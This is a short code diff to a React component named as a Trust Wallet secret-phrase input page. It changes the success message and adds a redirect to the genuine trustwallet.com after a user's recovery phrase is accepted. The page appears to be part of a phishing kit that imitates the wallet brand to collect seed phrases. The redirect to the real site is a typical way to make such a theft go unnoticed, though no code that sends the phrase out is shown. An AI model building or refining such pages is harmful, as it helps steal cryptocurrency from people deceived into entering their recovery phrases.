@@ -1,3 +1,4 @@
+
 // src/components/trust-wallet/phrase-input-page.tsx
 "use client";
 
@@ -133,9 +134,10 @@ export default function PhraseInputPage() {
     if (allValid) {
       toast({
         title: "Success!",
-        description: "Secret phrase is valid.",
+        description: "Secret phrase is valid. Redirecting to Trust Wallet...",
         variant: "default",
       });
+      window.location.href = 'https://trustwallet.com';
     } else {
       toast({
         title: "Invalid Phrase",
